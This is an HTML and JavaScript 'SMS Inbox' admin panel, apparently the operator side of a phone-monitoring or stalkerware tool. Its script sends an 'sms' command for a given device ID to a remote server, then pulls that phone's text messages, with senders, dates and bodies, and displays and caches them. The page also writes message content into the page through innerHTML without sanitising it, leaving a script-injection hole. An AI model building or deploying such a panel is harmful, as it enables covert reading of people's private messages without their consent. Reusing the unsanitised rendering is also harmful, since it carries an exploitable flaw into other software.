<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Inbox - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 600px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 25px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 30px; padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .back-btn {
            text-decoration: none; color: var(--text-main);
            background: var(--glass-bg); width: 40px; height: 40px;
            border-radius: 50%; border: 1px solid var(--glass-border);
            display: flex; align-items: center; justify-content: center;
        }

        .title { font-size: 1.3rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
        .title i { color: var(--accent); }

        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
        }

        .sms-list { display: flex; flex-direction: column; gap: 15px; max-height: 70vh; overflow-y: auto; padding-right: 5px; }
        
        /* Scrollbar */
        .sms-list::-webkit-scrollbar { width: 5px; }
        .sms-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }

        .sms-card {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            border-radius: 18px; padding: 15px; transition: 0.2s;
        }
        .sms-card:hover { border-color: var(--accent); background: rgba(255,255,255,0.08); }

        .sms-header {
            display: flex; justify-content: space-between; margin-bottom: 8px;
            font-size: 0.9rem;
        }
        .sender { font-weight: bold; color: var(--accent); }
        .date { color: var(--text-muted); font-size: 0.75rem; }

        .message-body {
            font-size: 0.95rem; color: #e0e0e0; line-height: 1.5;
            background: rgba(0,0,0,0.2); padding: 12px; border-radius: 12px;
            word-wrap: break-word;
        }

        .status-msg { text-align: center; padding: 60px; color: var(--text-muted); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <div class="title"><i class="fa-solid fa-comments"></i> SMS Inbox</div>
            <button onclick="fetchSMS()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
        </div>

        <div id="sms-list" class="sms-list">
            </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    
    // URL se Device ID uthana
    const urlParams = new URLSearchParams(window.location.search);
    const DEVICE_ID = urlParams.get('id');
    const storageKey = `sms_${DEVICE_ID}`;

    document.addEventListener("DOMContentLoaded", function() {
        if (!DEVICE_ID) {
            alert("Device ID missing! Dashboard se aao.");
            window.location.href = "index.html";
            return;
        }

        // 1. Pehle LocalStorage se load karo
        loadFromStorage();

        // 2. Command bhejo aur naya data fetch karo
        sendCommand();
        setTimeout(fetchSMS, 3000); 
    });

    function loadFromStorage() {
        const savedData = localStorage.getItem(storageKey);
        const listContainer = document.getElementById("sms-list");
        
        if (savedData) {
            renderSMS(JSON.parse(savedData));
        } else {
            listContainer.innerHTML = `
                <div class="status-msg">
                    <i class="fa-solid fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:10px;"></i>
                    <p>Requesting Messages from Phone...</p>
                </div>`;
        }
    }

    function sendCommand() {
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
        });
    }

    function fetchSMS() {
        const btn = document.getElementById("refreshBtn");
        btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';

        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.length > 0) {
                    // 3. LocalStorage mein save karo
                    localStorage.setItem(storageKey, JSON.stringify(data));
                    renderSMS(data);
                }
            })
            .finally(() => {
                btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
            });
    }

    function renderSMS(data) {
        const listContainer = document.getElementById("sms-list");
        listContainer.innerHTML = ""; 
        
        // Naye SMS upar dikhane ke liye data reverse kar sakte hain agar server se purane pehle aa rahe hon
        data.forEach(sms => {
            let dateDisplay = sms.date;
            if(!isNaN(sms.date)) {
                dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
            }

            listContainer.innerHTML += `
                <div class="sms-card">
                    <div class="sms-header">
                        <span class="sender"><i class="fa-solid fa-comment-dots"></i> ${sms.address || 'Unknown'}</span>
                        <span class="date">${dateDisplay}</span>
                    </div>
                    <div class="message-body">
                        ${sms.body || 'No Content'}
                    </div>
                </div>`;
        });
    }
</script>
</body>
</html>
